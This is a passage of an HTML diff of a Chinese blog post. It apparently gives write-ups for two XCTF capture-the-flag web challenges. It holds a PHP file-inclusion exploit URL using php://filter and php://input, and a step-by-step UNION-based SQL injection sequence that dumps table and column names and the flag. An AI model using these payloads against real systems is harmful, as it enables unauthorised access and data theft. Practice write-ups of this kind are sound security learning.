class="string">&quot;file1&quot;</span>];</span><br><span class="line">    <span class="variable">$file2</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file2&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$file1</span>) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$file2</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file2</span>) === <span class="string">&quot;hello ctf&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="variable">$file1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NONONO&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>大致意思是get传file1和file2，file2的内容是<code>hello ctf</code><br>file1使用php:&#x2F;&#x2F;filter伪协议来读取源代码<br>file2可以用php:&#x2F;&#x2F;input来绕过<br><code>/?file1=php://filter/read=convert.base64-encode/resource=flag.php&amp;file2=php://input</code><br>这里需要使用burpsite抓包修改get为POST，并且POST传”hello ctf”<br>得到base64加密后的<br><code>PD9waHAKZWNobyAiV1JPTkcgV0FZISI7Ci8vICRmbGFnID0gY3liZXJwZWFjZXtmMTRiMDE4MzJlZDliMThiMzM4MGRiYzE3NzE1NjgyOX0=</code><br>解密，获得flag<br><code>cyberpeace&#123;f14b01832ed9b18b3380dbc177156829&#125;</code></p>
+<h1 id="NewsCenter-x2F-XCTF-4th-QCTF-2018-2"><a href="#NewsCenter-x2F-XCTF-4th-QCTF-2018-2" class="headerlink" title="NewsCenter&#x2F;XCTF 4th-QCTF-2018(2)"></a>NewsCenter&#x2F;XCTF 4th-QCTF-2018(2)</h1><p>输入<code>1&#39; or 1=1#</code>发现有sql注入漏洞<br>sqlmap对抓包结果进行注入，得到flag<br><code>cyberpeace&#123;d59b2f9aadab6159052039f0edeefe3a&#125;</code><br>但是这个flag不是这一题的<br><strong>为什么sqlmap不行呢？</strong><br><a target="_blank" rel="noopener" href="https://www.bbsmax.com/A/1O5ENAr4d7/">sqlmap手册</a><br>因为之前用sqlmap刷了其它题，有缓存<br><strong>使用–purge清除缓存注入</strong></p>
+<p>直接手工注入<br><code>1&#39; order by 4#</code>错误，说明3个注入点<br><code>1&#39; union select 1,2,3#</code>，发现2，3有输出<br><code>1&#39; union select 1,database(),3#</code>，dbs&#x3D;&#x3D;<code>news</code><br><code>1&#39; union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=&#39;news&#39;#</code>，tbn&#x3D;<code>news,secret_table</code><br><code>1&#39; union select 1,database(),group_concat(column_name) from information_schema.columns where table_name=&#39;secret_table&#39;#</code>，<code>id,fl4g</code><br><code>1&#39; union select 1,group_concat(id),group_concat(fl4g) from secret_table#</code><br>得到flag<br><code>QCTF&#123;sq1_inJec7ion_ezzz&#125;</code></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/08/30/WRITEUP/" data-id="cl7fmhprp00015gvb27gh3kpc" data-title="WRITEUP" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2022/08/30/Metaspolt/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Metaspolt</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/08/30/WRITEUP/">WRITEUP</a>
+          </li>
+        
+          <li>
+            <a href="/2022/08/30/Metaspolt/">Metaspolt</a>
+          </li>
+        
+          <li>
+            <a href="/2022/08/30/DVWA/">DVWA</a>
+          </li>
+        
+          <li>
+            <a href="/2022/08/30/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/">常用工具</a>
+          </li>
+        
+          <li>
+            <a href="/2022/08/30/hello-world/">Hello World</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2022 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
